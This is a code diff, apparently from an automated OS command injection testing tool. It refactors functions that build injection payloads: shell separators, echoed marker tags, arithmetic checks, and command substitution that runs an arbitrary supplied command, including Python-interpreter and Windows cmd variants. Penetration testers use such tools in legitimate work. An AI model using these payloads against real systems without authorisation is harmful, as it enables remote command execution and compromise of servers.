@@ -36,44 +36,22 @@ def decision(separator, TAG, randv1, randv2):
               "\"') do @set /p = " + TAG + "%i" + TAG + TAG + settings.CMD_NUL
               )
   else:
-    if not settings.WAF_ENABLED:
-      if settings.USE_BACKTICKS:
-        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
-      else:
-        math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
+    if settings.USE_BACKTICKS or settings.WAF_ENABLED:
+      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " %2B " + str(randv2) + settings.CMD_SUB_SUFFIX
     else:
-      if settings.USE_BACKTICKS:
-        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
-      else:
-        math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"
+      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "%2B" + str(randv2) + "))"
 
     if settings.SKIP_CALC:
-      if settings.USE_BACKTICKS:
-        payload = (separator +
-                  "echo " + TAG +
-                  TAG + "" + TAG + "" + 
-                  separator
-                   )
-      else:
-        payload = (separator +
-                  "echo " + TAG +
-                  "$(echo " + TAG + ")" + TAG + "" + 
-                  separator
-                   )
+      payload = (separator +
+                "echo " + TAG +
+                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                )
     else:
-      if settings.USE_BACKTICKS:
-        payload = (separator +
-                  "echo " + TAG +
-                  math_calc +
-                  TAG + "" + TAG + ""
-                   )
-      else:
-        payload = (separator +
-                  "echo " + TAG +
-                  math_calc +
-                  "$(echo " + TAG + ")" + TAG + "" + 
-                  separator
-                   )
+      payload = (separator +
+                "echo " + TAG +
+                math_calc +
+                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                )
   return payload
 
 """
@@ -96,16 +74,14 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
       payload = (separator +
                 settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                 TAG +
-                TAG + "')\"" + 
-                separator
+                TAG + "')\""
                 )
     else:
       payload = (separator +
                 settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                 "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" +
                 TAG + "'%2B'" +
-                TAG + "')\"" + 
-                separator
+                TAG + "')\""
                 )
   return payload
 
@@ -126,25 +102,13 @@ def cmd_execution(separator, TAG, cmd):
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
-    if settings.USE_BACKTICKS:
-      cmd_exec = "`" + cmd + "`"
-      payload = (separator +
-                "echo " + TAG +
-                "" + TAG + "" +
-                cmd_exec +
-                "" + TAG + "" + TAG + "" + 
-                separator
-                )
-    else:
-      cmd_exec = "$(" + cmd + ")"
-      payload = (separator +
-                "echo " + TAG +
-                "$(echo " + TAG + ")" +
-                cmd_exec +
-                "$(echo " + TAG + ")" + TAG + "" + 
-                separator
-                )
-
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX 
+    payload = (separator +
+              "echo " + TAG +
+              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
+              cmd_exec +
+              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
+              )
   return payload
 
 """
@@ -164,23 +128,14 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                 TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p=%i " + settings.CMD_NUL
                 )
-
   else:
-
-    if settings.USE_BACKTICKS:
-      payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + 
-                " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo `" + cmd + ")`" + 
-                TAG + "'%2B'" + TAG + "')\"" + 
-                separator
-                )
-    else:
-      payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + 
-                " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" + cmd + "))'%2B'" + 
-                TAG + "'%2B'" + TAG + "')\"" + 
-                separator
-                )
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
+    payload = (separator +
+              settings.LINUX_PYTHON_INTERPRETER + 
+              " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'%2B'" + 
+              TAG + "'%2B'" + TAG + "')\""
+              )
   return payload
 
 # eof
